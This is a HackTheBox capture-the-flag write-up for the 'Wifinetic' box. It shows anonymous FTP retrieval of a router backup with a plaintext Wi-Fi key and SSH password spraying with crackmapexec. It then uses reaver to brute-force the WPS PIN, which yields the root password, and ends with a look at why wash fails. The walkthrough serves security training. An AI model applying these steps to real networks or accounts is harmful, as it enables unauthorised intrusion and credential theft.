HTB: Wifinetic
==============

![Wifinetic](https://0xdf.gitlab.io/img/wifinetic-cover.png)

Wifinetic is a realitively simple box, but based on some cool tech Felemos did to virtualize a wireless network. I’ll start with anonymous access to an FTP server that contains a backup file with a WPA wireless config. That config has a pre-shared key (password) in it, that also works over SSH. On the box, I’ll find a few wireless interfaces configured, and the reaver WPA WPS pin crackign tool. This tool allows me to brute force leak the pre-shared key for the wireless network, which happens to be the root password. In Beyond Root, I’ll look at the wash command, and why it doesn’t work well on this box despite being in almost all of the reaver tutorials.

## Box Info

Name[Wifinetic](https://www.hackthebox.com/machines/wifinetic) [![Wifinetic](https://0xdf.gitlab.io/icons/box-wifinetic.png)](https://www.hackthebox.com/machines/wifinetic)

[Play on HackTheBox](https://www.hackthebox.com/machines/wifinetic)Release Date[13 Sep 2023](https://twitter.com/hackthebox_eu/status/1702366621803667739)Retire Date16 Sep 2023OSLinux ![Linux](https://0xdf.gitlab.io/icons/Linux.png)Base PointsEasy \[20\]![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)N/A (non-competitive)![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)N/A (non-competitive)Creator[![felamos](https://www.hackthebox.eu/badge/image/27390)](https://app.hackthebox.com/users/27390)

## Recon

### nmap

`nmap` finds three open TCP ports, FTP (21), SSH (22) and DNS (53):

```
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.247
Starting Nmap 7.80 ( https://nmap.org ) at 2023-09-12 16:18 EDT
Nmap scan report for 10.10.11.247
Host is up (0.093s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
53/tcp open  domain

Nmap done: 1 IP address (1 host up) scanned in 6.78 seconds
oxdf@hacky$ nmap -p 21,22,53 -sCV 10.10.11.247
Starting Nmap 7.80 ( https://nmap.org ) at 2023-09-12 16:28 EDT
Nmap scan report for 10.10.11.247
Host is up (0.092s latency).

PORT   STATE SERVICE    VERSION
21/tcp open  ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
| -rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
| -rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
| -rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.10.14.6
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
53/tcp open  tcpwrapped
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds

```

There is anonymous FTP access I’ll definitely want to check out further. Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) version, the host is likely running Ubuntu 20.04 focal.

UDP scanning is slow and unreliable. Still, it looks like DNS (53) and perhaps DHCP (67) might be open:

```
oxdf@hacky$ nmap -sU --top 10 10.10.11.247
Starting Nmap 7.80 ( https://nmap.org ) at 2023-09-12 16:26 EDT
Nmap scan report for 10.10.11.247
Host is up (0.092s latency).

PORT     STATE         SERVICE
53/udp   open|filtered domain
67/udp   open|filtered dhcps
123/udp  closed        ntp
135/udp  closed        msrpc
137/udp  closed        netbios-ns
138/udp  closed        netbios-dgm
161/udp  closed        snmp
445/udp  closed        microsoft-ds
631/udp  closed        ipp
1434/udp closed        ms-sql-m

Nmap done: 1 IP address (1 host up) scanned in 4.03 seconds

```

### FTP - TCP 21

#### Collect Files

To get a clearer picture of what’s on the FTP server I’ll connect using the name “anonymous” and it doesn’t ask for a password:

```
oxdf@hacky$ ftp 10.10.11.247
Connected to 10.10.11.247.
220 (vsFTPd 3.0.3)
Name (10.10.11.247:oxdf): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>

```

There’s five files in the share:

```
ftp> ls
229 Entering Extended Passive Mode (|||41883|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          4434 Jul 31 11:03 MigrateOpenWrt.txt
-rw-r--r--    1 ftp      ftp       2501210 Jul 31 11:03 ProjectGreatMigration.pdf
-rw-r--r--    1 ftp      ftp         60857 Jul 31 11:03 ProjectOpenWRT.pdf
-rw-r--r--    1 ftp      ftp         40960 Sep 11 15:25 backup-OpenWrt-2023-07-26.tar
-rw-r--r--    1 ftp      ftp         52946 Jul 31 11:03 employees_wellness.pdf
226 Directory send OK.

```

I’ll grab all five by turning off the prompt and using `mget`:

```
ftp> prompt off
Interactive mode off.
ftp> mget *
local: MigrateOpenWrt.txt remote: MigrateOpenWrt.txt
229 Entering Extended Passive Mode (|||46603|)
150 Opening BINARY mode data connection for MigrateOpenWrt.txt (4434 bytes).
100% |****************************************************|  4434       12.66 MiB/s    00:00 ETA226 Transfer complete.
4434 bytes received in 00:00 (45.51 KiB/s)
local: ProjectGreatMigration.pdf remote: ProjectGreatMigration.pdf
229 Entering Extended Passive Mode (|||43303|)
150 Opening BINARY mode data connection for ProjectGreatMigration.pdf (2501210 bytes).
100% |****************************************************|  2442 KiB    1.19 MiB/s    00:00 ETA226 Transfer complete.
2501210 bytes received in 00:02 (1.14 MiB/s)
local: ProjectOpenWRT.pdf remote: ProjectOpenWRT.pdf
229 Entering Extended Passive Mode (|||41309|)
150 Opening BINARY mode data connection for ProjectOpenWRT.pdf (60857 bytes).
100% |****************************************************| 60857      312.13 KiB/s    00:00 ETA226 Transfer complete.
60857 bytes received in 00:00 (208.67 KiB/s)
local: backup-OpenWrt-2023-07-26.tar remote: backup-OpenWrt-2023-07-26.tar
229 Entering Extended Passive Mode (|||48627|)
150 Opening BINARY mode data connection for backup-OpenWrt-2023-07-26.tar (40960 bytes).
100% |****************************************************| 40960      418.15 KiB/s    00:00 ETA226 Transfer complete.
40960 bytes received in 00:00 (210.50 KiB/s)
local: employees_wellness.pdf remote: employees_wellness.pdf
229 Entering Extended Passive Mode (|||45844|)
150 Opening BINARY mode data connection for employees_wellness.pdf (52946 bytes).
100% |****************************************************| 52946      271.76 KiB/s    00:00 ETA226 Transfer complete.
52946 bytes received in 00:00 (181.35 KiB/s)

```

#### Files Overview

A quick triage of the files gives:

- `employees_wellness.pdf` \- A letter about a new employee wellness program at the company from Samantha Wood, HR Manager, `samantha.wood93@wifinetic.htb`.
- `ProjectGreatMigration.pdf` \- A slide deck filled mostly with non-sense, but that does include more contact information in the final slide:

![image-20230912203240079](https://0xdf.gitlab.io/img/image-20230912203240079.png)

- `ProjectOpenWRT.pdf` \- A proposal to move from OpenWRT to Debian for the existing network infrastructure submitted to `management@wifinetic.htb` from Oliver Walker, Wireless Network Administrator, `olivia.walker17@wifinetic.htb`. This document has a lot of things that could be useful enumeration, though for Wifinetic, only knowing that I should expect OpenWRT is at all needed.
- `MigrateOpenWrt.txt` \- A text-based outline of the steps and substeps for migrating to Debian.
- `backup-OpenWrt-2023-07-26.tar` \- An archive with the configuration files for a WiFi setup.

#### Backup

Digging deeper into the backup, it’s an `etc` folder:

```
oxdf@hacky$ ls etc
config  dropbear  group  hosts  inittab  luci-uploads  nftables.d  opkg  passwd  profile  rc.local  shells  shinit  sysctl.conf  uhttpd.crt  uhttpd.key

```

Most of these don’t have much of interesting. `passwd` does provide a list of usernames:

```
root:x:0:0:root:/root:/bin/ash
daemon:*:1:1:daemon:/var:/bin/false
ftp:*:55:55:ftp:/home/ftp:/bin/false
network:*:101:101:network:/var:/bin/false
nobody:*:65534:65534:nobody:/var:/bin/false
ntp:x:123:123:ntp:/var/run/ntp:/bin/false
dnsmasq:x:453:453:dnsmasq:/var/run/dnsmasq:/bin/false
logd:x:514:514:logd:/var/run/logd:/bin/false
ubus:x:81:81:ubus:/var/run/ubus:/bin/false
netadmin:x:999:999::/home/netadmin:/bin/false

```

The `config` directory has a handful of files:

```
oxdf@hacky$ ls etc/config/
dhcp  dropbear  firewall  luci  network  rpcd  system  ucitrack  uhttpd  wireless

```

The only one with anything useful is `wireless`:

```
oxdf@hacky$ cat etc/config/wireless

config wifi-device 'radio0'
        option type 'mac80211'
        option path 'virtual/mac80211_hwsim/hwsim0'
        option cell_density '0'
        option channel 'auto'
        option band '2g'
        option txpower '20'

config wifi-device 'radio1'
        option type 'mac80211'
        option path 'virtual/mac80211_hwsim/hwsim1'
        option channel '36'
        option band '5g'
        option htmode 'HE80'
        option cell_density '0'

config wifi-iface 'wifinet0'
        option device 'radio0'
        option mode 'ap'
        option ssid 'OpenWrt'
        option encryption 'psk'
        option key 'VeRyUniUqWiFIPasswrd1!'
        option wps_pushbutton '1'

config wifi-iface 'wifinet1'
        option device 'radio1'
        option mode 'sta'
        option network 'wwan'
        option ssid 'OpenWrt'
        option encryption 'psk'
        option key 'VeRyUniUqWiFIPasswrd1!'

```

It’s defining two devices, each with an interface on it. There’s a pre-shared key (PSK, or password) for a WiFi network.

### DNS - TCP/USP 53

Given the use of `wifinetic.htb` in the documents, I’ll add that to my `/etc/hosts` file:

```
10.10.11.247 wifinetic.htb

```

Given that DNS is listening on TCP, I’ll try a zone transfer to see if there are any subdomains:

```
oxdf@hacky$ dig asxf @10.10.11.247 wifinetic.htb
;; communications error to 10.10.11.247#53: timed out
;; communications error to 10.10.11.247#53: timed out
;; communications error to 10.10.11.247#53: timed out

; <<>> DiG 9.18.12-0ubuntu0.22.04.1-Ubuntu <<>> asxf @10.10.11.247 wifinetic.htb
;; global options: +cmd
;; no servers could be reached

;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 17349
;; flags: qr aa rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 65494
;; QUESTION SECTION:
;wifinetic.htb.                 IN      A

;; ANSWER SECTION:
wifinetic.htb.          0       IN      A       10.10.11.247

;; Query time: 0 msec
;; SERVER: 127.0.0.53#53(127.0.0.53) (UDP)
;; WHEN: Tue Sep 12 20:44:43 EDT 2023
;; MSG SIZE  rcvd: 58

```

I’m not sure why it times out at first, but it eventually succeeds and finds just the main domain.

## Shell as netadmin

### SSH Password Bruteforce

With the password from the Wifi config, I’ll use `crackmapexec` to try each user from the `passwd` file with the password from the wireless config over SSH. I like to use `--continue-on-success` in case there are more than one user that shares that password. It finds one:

```
oxdf@hacky$ crackmapexec ssh 10.10.11.247 -u users -p 'VeRyUniUqWiFIPasswrd1!' -
ontinue-on-success
SSH         10.10.11.247    22     10.10.11.247     [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.9
SSH         10.10.11.247    22     10.10.11.247     [-] root:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] daemon:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] ftp:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] network:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] nobody:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] ntp:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] dnsmasq:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] logd:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [-] ubus:VeRyUniUqWiFIPasswrd1! Authentication failed.
SSH         10.10.11.247    22     10.10.11.247     [+] netadmin:VeRyUniUqWiFIPasswrd1!

```

### Shell

I’m able to connect with that username / password:

```
oxdf@hacky$ sshpass -p 'VeRyUniUqWiFIPasswrd1!' ssh netadmin@10.10.11.247
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64)
...[snip]...
netadmin@wifinetic:~$

```

And read the user flag:

```
netadmin@wifinetic:~$ cat user.txt
e5540a0a************************

```

## Shell as root

### Enumeration

#### Filesystem

#### Home Directories

The netadmin user’s home directory is basically empty:

```
netadmin@wifinetic:~$ ls -la
total 28
drwxr-xr-x  3 netadmin netadmin 4096 Sep 11 16:40 .
drwxr-xr-x 24 root     root     4096 Sep 11 16:58 ..
lrwxrwxrwx  1 root     root        9 Sep 11 16:08 .bash_history -> /dev/null
-rw-r--r--  1 netadmin netadmin  220 Feb 25  2020 .bash_logout
-rw-r--r--  1 netadmin netadmin 3771 Feb 25  2020 .bashrc
drwx------  2 netadmin netadmin 4096 Sep 11 16:40 .cache
-rw-r--r--  1 netadmin netadmin  807 Feb 25  2020 .profile
-rw-r-----  1 root     netadmin   32 Sep 13 11:01 user.txt

```

There are a bunch of other users with home directories in `/home`:

```
netadmin@wifinetic:/home$ ls
ayoung33   dwright27   janderson42  lturner56  mrobinson78  owalker17  sjohnson88  tclark84
bwhite3    eroberts25  jletap77     mhughes12  netadmin     pharris47  swood93
dmorgan99  jallen10    kgarcia22    mickhat    nlee61       rturner45  tcarter90

```

They are all the same, with some standard files as well as a `.ssh` directory that netadmin can’t access.

#### /opt

`/opt` has a `share` directory that seems to match what’s available over FTP:

```
netadmin@wifinetic:/opt$ ls
share
netadmin@wifinetic:/opt$ cd share/
netadmin@wifinetic:/opt/share$ ls
backup-OpenWrt-2023-07-26.tar  MigrateOpenWrt.txt         ProjectOpenWRT.pdf
employees_wellness.pdf         ProjectGreatMigration.pdf

```

The `vsftpd.conf` file in `/etc/` confirms this (using `grep` to remove lines that start with a comment marker `#`):

```
netadmin@wifinetic:/etc$ cat vsftpd.conf  | grep -v "^#"
listen=NO
listen_ipv6=YES
anonymous_enable=yes
local_enable=NO
anon_root=/opt/share/
no_anon_password=YES
hide_ids=YES
pasv_min_port=40000
pasv_max_port=50000
anon_mkdir_write_enable=YES
anon_mkdir_write_enable=YES
dirmessage_enable=YES
use_localtime=YES
xferlog_enable=YES
connect_from_port_20=YES
chown_uploads=YES
chown_username=ftp
secure_chroot_dir=/var/run/vsftpd/empty
pam_service_name=vsftpd
rsa_cert_file=/etc/ssl/certs/ssl-cert-snakeoil.pem
rsa_private_key_file=/etc/ssl/private/ssl-cert-snakeoil.key
ssl_enable=NO

```

#### Privileged Binaries

I’ll always check for interesting SetUID and SetGID binaries. Enumeration tools like \[LinPEAS\])() will identify these as well:

```
netadmin@wifinetic:~$ find / -perm -4000 -or -perm -2000 2>/dev/null
/usr/local/lib/python3.8
/usr/local/lib/python3.8/dist-packages
/usr/sbin/pam_extrausers_chkpwd
/usr/sbin/unix_chkpwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/utempter/utempter
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/wall
/usr/bin/mount
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/ssh-agent
/usr/bin/umount
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/expiry
/usr/bin/bsd-write
/usr/bin/chsh
/usr/bin/chage
/usr/bin/at
/usr/bin/chfn
/usr/bin/crontab
/usr/bin/newgrp
/usr/bin/su
/var/local
/var/log/journal
/var/log/journal/8e7b2e7692df48faa4e42d6cfc791ed2
/var/mail
/run/log/journal

```

These all seem standard. I’ll also look for binaries with capabilities:

```
netadmin@wifinetic:~$ getcap -r / 2>/dev/null
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/reaver = cap_net_raw+ep

```

The last one jumps out! [Reaver](https://manpages.ubuntu.com/manpages/jammy/man1/reaver.1.html) is a WPS cracking tool!

#### WiFi Interfaces

Looking at the network interfaces, there are six!

```
netadmin@wifinetic:~$ ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.247  netmask 255.255.254.0  broadcast 10.10.11.255
        inet6 dead:beef::250:56ff:feb9:a136  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:a136  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:a1:36  txqueuelen 1000  (Ethernet)
        RX packets 78157  bytes 4862131 (4.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 67703  bytes 6498829 (6.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 32188  bytes 1932028 (1.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 32188  bytes 1932028 (1.9 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

mon0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 02-00-00-00-02-00-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)
        RX packets 134589  bytes 23695914 (23.6 MB)
        RX errors 0  dropped 134589  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.1  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:0  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:00:00  txqueuelen 1000  (Ethernet)
        RX packets 4486  bytes 422644 (422.6 KB)
        RX errors 0  dropped 617  overruns 0  frame 0
        TX packets 5183  bytes 601033 (601.0 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.23  netmask 255.255.255.0  broadcast 192.168.1.255
        inet6 fe80::ff:fe00:100  prefixlen 64  scopeid 0x20<link>
        ether 02:00:00:00:01:00  txqueuelen 1000  (Ethernet)
        RX packets 1304  bytes 181765 (181.7 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4486  bytes 503392 (503.3 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

wlan2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

`eth0` is the standard LAN interface that has the 10.10.11.247 IP that I’ve been attacking. `lo` is the standard localhost interface with 127.0.0.1.

`mon` interfaces (like `mon0`) are typically used for a monitor mode interfaces. This is used for sniffing and monitoring traffic on a WiFi network. `wlan` interfaces (like the other three) are used for interfacing with wireless networks.

Wireless settings are typically stored in `/etc/wpa_supplicant.conf`, which is present, but netadmin can’t read it:

```
netadmin@wifinetic:/etc$ cat wpa_supplicant.conf
cat: wpa_supplicant.conf: Permission denied

```

`iw dev` will give more information about the wireless interfaces:

```
netadmin@wifinetic:~$ iw dev
phy#2
        Interface mon0
                ifindex 7
                wdev 0x200000002
                addr 02:00:00:00:02:00
                type monitor
                txpower 20.00 dBm
        Interface wlan2
                ifindex 5
                wdev 0x200000001
                addr 02:00:00:00:02:00
                type managed
                txpower 20.00 dBm
phy#1
        Unnamed/non-netdev interface
                wdev 0x100000155
                addr 42:00:00:00:01:00
                type P2P-device
                txpower 20.00 dBm
        Interface wlan1
                ifindex 4
                wdev 0x100000001
                addr 02:00:00:00:01:00
                ssid OpenWrt
                type managed
                channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
                txpower 20.00 dBm
phy#0
        Interface wlan0
                ifindex 3
                wdev 0x1
                addr 02:00:00:00:00:00
                ssid OpenWrt
                type AP
                channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
                txpower 20.00 dBm

```

This gives a bunch of information about each physical network interface as well as the interfaces on them.

`wlan0` is on `phy0`. It’s running as an access point ( `type AP`) with SSID of `OpenWrt` on channel 1.

`wlan1` is on `phy1`, and is running in “managed” mode, which suggests it’s a client. Given that the SSID, channel, and center frequency are the same as `wlan0`, this is a client on that access point.

`wlan2` and `mon0` are on `phy2`. `wlan2` is also acting as a client (in “managed” mode), where as `mon0` is in monitor mode as suspected. `wlan2` doesn’t show any connection.

### WPA Brute Force

#### Background

WiFi Protected Setup (WPS) is a standard designed to make joining a WiFi router easier, especially in home settings. The device would have an 8 digit pin printed on the device, and the user could enter that pin to join the network.

There is an issue with the implementation making it trivial to brute-force the 8-digit pin. In theory, this was meant to offer one hundred million possible pins. Practically speaking, the WPS system will tell you if the first four digits are correct, and then if the next three digits are correct. It also uses the last digit as a checksum. This means to effectively brute force this, an attacker only needs to try 10,000 possibilities for the first four, 1,000 for the next four, or at most 11,000 pins (much less than one hundred million!).

Reaver is a tool used to recover the network WPA PSK (password) by brute forcing the WPS pin.

#### Reaver Usage

Running `reaver` shows two required arguments:

```
netadmin@wifinetic:~$ reaver

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

Required Arguments:
        -i, --interface=<wlan>          Name of the monitor-mode interface to use
        -b, --bssid=<mac>               BSSID of the target AP

Optional Arguments:
        -m, --mac=<mac>                 MAC of the host system
        -e, --essid=<ssid>              ESSID of the target AP
        -c, --channel=<channel>         Set the 802.11 channel for the interface (implies -f)
        -s, --session=<file>            Restore a previous session file
        -C, --exec=<command>            Execute the supplied command upon successful pin recovery
        -f, --fixed                     Disable channel hopping
        -5, --5ghz                      Use 5GHz 802.11 channels
        -v, --verbose                   Display non-critical warnings (-vv or -vvv for more)
        -q, --quiet                     Only display critical messages
        -h, --help                      Show help

Advanced Options:
        -p, --pin=<wps pin>             Use the specified pin (may be arbitrary string or 4/8 digit WPS pin)
        -d, --delay=<seconds>           Set the delay between pin attempts [1]
        -l, --lock-delay=<seconds>      Set the time to wait if the AP locks WPS pin attempts [60]
        -g, --max-attempts=<num>        Quit after num pin attempts
        -x, --fail-wait=<seconds>       Set the time to sleep after 10 unexpected failures [0]
        -r, --recurring-delay=<x:y>     Sleep for y seconds every x pin attempts
        -t, --timeout=<seconds>         Set the receive timeout period [10]
        -T, --m57-timeout=<seconds>     Set the M5/M7 timeout period [0.40]
        -A, --no-associate              Do not associate with the AP (association must be done by another application)
        -N, --no-nacks                  Do not send NACK messages when out of order packets are received
        -S, --dh-small                  Use small DH keys to improve crack speed
        -L, --ignore-locks              Ignore locked state reported by the target AP
        -E, --eap-terminate             Terminate each WPS session with an EAP FAIL packet
        -J, --timeout-is-nack           Treat timeout as NACK (DIR-300/320)
        -F, --ignore-fcs                Ignore frame checksum errors
        -w, --win7                      Mimic a Windows 7 registrar [False]
        -K, --pixie-dust                Run pixiedust attack
        -Z                              Run pixiedust attack

Example:
        reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -vv

```

I need the name of the name of the monitor-mode interface and the BSSID of the target AP. The example at the bottom, `reaver -i wlan0mon -b 00:90:4C:C1:AC:21 -vv` shows the BSSID looks like a MAC address, and in fact, [it is](https://en.wikipedia.org/wiki/Service_set_(802.11_network)).

#### Run Reaver

The target AP is `wlan0`, which has a MAC from the `iw` command above of `02:00:00:00:00:00`. The monitor-mode interface is `mon0`. Most `reaver` tutorials show using the `wash` command to get the BSSID/MAC. This doesn’t work here, and I’ll look at that in [Beyond Root](#beyond-root).

I’ll use those to run `reaver`:

```
netadmin@wifinetic:~$ reaver -i mon0 -b 02:00:00:00:00:00 -vv

Reaver v1.6.5 WiFi Protected Setup Attack Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>

[+] Waiting for beacon from 02:00:00:00:00:00
[+] Switching mon0 to channel 1
[+] Received beacon from 02:00:00:00:00:00
[+] Trying pin "12345670"
[+] Sending authentication request
[!] Found packet with bad FCS, skipping...
[+] Sending association request
[+] Associated with 02:00:00:00:00:00 (ESSID: OpenWrt)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message
[+] Received M3 message
[+] Sending M4 message
[+] Received M5 message
[+] Sending M6 message
[+] Received M7 message
[+] Sending WSC NACK
[+] Sending WSC NACK
[+] Pin cracked in 2 seconds
[+] WPS PIN: '12345670'
[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
[+] AP SSID: 'OpenWrt'
[+] Nothing done, nothing to save.

```

Very quickly it is able to crack the WPA password (or pre-shared key (PSK)) for the wireless network.

### su / SSH

This password works as the password for root on the box, either with `su` in an existing session:

```
netadmin@wifinetic:~$ su -
Password:
root@wifinetic:~#

```

Or starting a new SSH session:

```
oxdf@hacky$ sshpass -p 'WhatIsRealAnDWhAtIsNot51121!' ssh root@10.10.11.247
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-162-generic x86_64)
...[snip]...
root@wifinetic:~#

```

Either way, I can grab `root.txt`:

```
root@wifinetic:~# cat root.txt
b8e6c359************************

```

## Beyond Root

### Background

Most tutorials showing how to run `reaver` will use something like `wash -i mon0` to get the BSSIDs of the available networks and enumerate is the WPS is locked (which makes the brute force much less likely to work).

`wash` is a tool that comes as part of `reaver`, and is meant to enumerate networks. But it requires the `CAP_NET_RAW` capability, just like `reaver` does.

It is unusual to be performing this attack without root on the attacking box. Typically, this attack is done from attacker controller hardware in local proximity to the WiFi network. But even if someone is doing it from a compromised box, they will need root, as it is _very_ unlikely to find `reaver` sitting around with the necessary capabilities in the real world as is the case here for HTB.

### Running wash as netadmin

With a non-root shell on the box, if I try to run `wash -i mon0` as recommended, and it just hangs:

```
netadmin@wifinetic:~$ wash -i mon0
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------

```

### Source Review

The source code for `wash` is [here](https://github.com/t6x/reaver-wps-fork-t6x/blob/bd0f38262224c1b88ba9f1f95cb5476a488d2295/src/wpsmon.c#L155), starting with the `wash_main` function. I’m no expert at C, but it seems like it is is doing active work on the network.

There’s a function called `send_probe_request` [here](https://github.com/t6x/reaver-wps-fork-t6x/blob/bd0f38262224c1b88ba9f1f95cb5476a488d2295/src/wpsmon.c#L595) that sends a packet. There’s also a loop over `next_packet`. Based on this, it makes perfect sense that `wash` would need some kind of capability or root privilege in order to work. In fact, I get errors when I try to run `wash` on some other interface:

```
netadmin@wifinetic:~$ wash -i wlan0
[X] ERROR: pcap_activate status -1
[X] PCAP: generic error code
couldn't get pcap handle, exiting
netadmin@wifinetic:~$ wash -i wlan1
[X] ERROR: pcap_activate status -1
[X] PCAP: generic error code
couldn't get pcap handle, exiting
netadmin@wifinetic:~$ wash -i wlan2
[X] ERROR: pcap_activate status -1
[X] PCAP: generic error code
couldn't get pcap handle, exiting

```

### Run wash as root

At this point, it seems like it’s clearly a permissions issue. So it’s surprising when running as root gives the same result:

```
root@wifinetic:~# wash -i mon0
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------

```

Interestingly, it now hangs instead of failing on `wlan0` and `wlan1`:

```
root@wifinetic:~# wash -i wlan0
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------
^C
root@wifinetic:~# wash -i wlan1
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------
^C

```

More interestingly, it works on `wlan2`:

```
root@wifinetic:~# wash -i wlan2
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------
02:00:00:00:00:00    1  -30  2.0  No             OpenWrt

```

Even _more_ interestingly, when I ran this on `wlan2`, I had `wash -i mon0` running in another terminal, and it printed as result at the same time:

```
root@wifinetic:~# wash -i mon0
BSSID               Ch  dBm  WPS  Lck  Vendor    ESSID
--------------------------------------------------------------------------------
02:00:00:00:00:00    1  -30  2.0  No             OpenWrt

```

### Working Theory

My current theory to explain all of this is:

- `wlan2` and `mon0` are the same physical device.
- `mon0` is in monitor mode. It cannot transmit outbound packets.
- `wash` works by sending a probe outbound, and then sniffing the response. The outbound probe and the sniffing almost certainly happen in different threads.
- When I run `wash -i mon0`, it tries to send a probe, but fails (due to the monitor mode). It then hangs waiting for a response.
- When I run `wash -i wlan2`, it sends the probe successfully.
- Both interfaces are able to see the response, parse it, and print.

That’s what I’ve got at the moment! Please reach out on Twitter (0xdf\_) or Discord (0xdf) if you have a better understanding!





